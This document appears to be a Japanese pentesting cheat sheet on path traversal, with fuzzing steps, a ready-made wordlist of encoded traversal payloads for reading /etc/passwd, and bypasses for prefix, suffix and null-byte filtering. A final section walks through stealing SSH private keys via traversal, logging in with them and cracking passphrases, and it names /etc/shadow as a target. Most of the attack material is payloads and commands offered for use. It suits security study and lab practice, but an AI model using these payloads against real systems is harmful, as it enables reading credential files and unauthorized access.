# Detection

## 注目ポイント

ファイルパスが含まれそうなパラメータを探す：
- `/image?filename=` のようなリクエスト
- `multipart/form-data` のファイル名パラメータ
```html
<form enctype="multipart/form-data" action="/upload.php" method="POST">
```

## Fuzz

[パラメータ・値のファジング](../../Tools/🐙FFUF.md#パラメータ・値のファジング)でも可能

1. 脆弱かと思われる箇所をIntruderで選択 → Add from list → Fuzzing: Path traversal（single file）を選択する
2. 200が返ったトラバーサルシーケンスで目的のファイルを取得する

---

# Exploitation

## トラバーサルシーケンス

|OS|シーケンス|
|---|---|
|Unix|`../`|
|Windows|`../` または `..\`（`\` または `%5C`）|

> [!TIP]
> スラッシュ・バックスラッシュのどちらも試すこと。
> Windowsでは `C:\` の指定は不要（相対パスで辿れる）。例：`..\..\xampp\apache\logs`

## 基本的な流れ

1. 動作確認として `/etc/passwd` を検出する
    - Windowsの場合：`C:\windows\system32\drivers\etc\hosts`

2. 有効なペイロード（トラバーサルシーケンス）がわかったら、目的のファイルを取得する

> [!TIP] 
> `/etc/passwd` は検出できても 目的のファイルが検出できない場合は、WAFで制限されているかのうせいがあるため、バイパスのためにURLエンコードを試す。
> 
> ```
> /image?filename=<@urlencode_all>../../home/user/secret<@/urlencode_all>
> ```

## /etc/passwd 用 Traversal Wordlist

> [!WARNING]
> Intruderの「URL encode these characters」を**opt-out（無効化）**すること。デフォルトでは特殊文字がURLエンコードされてトラバーサルシーケンスが破壊される。

```
/etc/passwd
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
....//etc/passwd
....//....//etc/passwd
....//....//....//etc/passwd
....//....//....//....//etc/passwd
....//....//....//....//....//etc/passwd
....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//etc/passwd
%2e%2e/etc/passwd
%2e%2e/%2e%2e/etc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
..%252fetc/passwd
..%252f..%252fetc/passwd
..%252f..%252f..%252fetc/passwd
..%252f..%252f..%252f..%252fetc/passwd
..%252f..%252f..%252f..%252f..%252fetc/passwd
..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
```

## 防御パターン別のエクスプロイト手法

### No defence（防御なし）

トラバーサルシーケンスを直接ブルートフォース
```
/image?filename=§§
```

### Prefix validation（絶対パスの検証）

`?filename=/var/www/images/36.jpg` のように絶対パスが指定されている場合、正常な値の後ろでPath traversalを実行する
```
/image?filename=10.jpg§§
```

### Suffix validation（拡張子の検証）

上記2つがうまくいかない場合、null byteを使用する（PHPはnull byteを文字列終端として扱うため、後続のサフィックス検証をバイパスできる）
```
/image?filename=§§%00
```

> [!NOTE]
> 複数のクエリを渡すには `&` を使う（例：`/image?filename=a.png../../shell.php&cmd=id`）

---

# SSH Private Keyの抽出

初期侵入ができていない段階でPath traversalを使って秘密鍵を取得する手法。

1. Path traversalで `/etc/passwd` を取得し、ユーザーとhomeディレクトリをメモする
```
user:x:1000:1000:user,,,:/home/<username>:/usr/bin/zsh
```

2. homeディレクトリ配下の秘密鍵を取得する（id_rsa以外の種類：[SSH Private Keyの種類](../Ports%20-%20Service/22%20-%20SSH.md#SSH%20Private%20Keyの種類)）
```
../../../../../../../../../home/<username>/.ssh/id_rsa
```

3. 秘密鍵でSSHサーバーにアクセスする
```zsh
ssh -i id_rsa <username>@<target_IP>
```

パスフレーズがある場合はssh2johnでクラックを試みる：[ハッシュ値の整形](../../Tools/🐈‍⬛Password%20Crack%20-%20JtR・Hashcat.md#ハッシュ値の整形)

> [!Note]
> `/etc/shadow` なども抽出の候補となり得る。
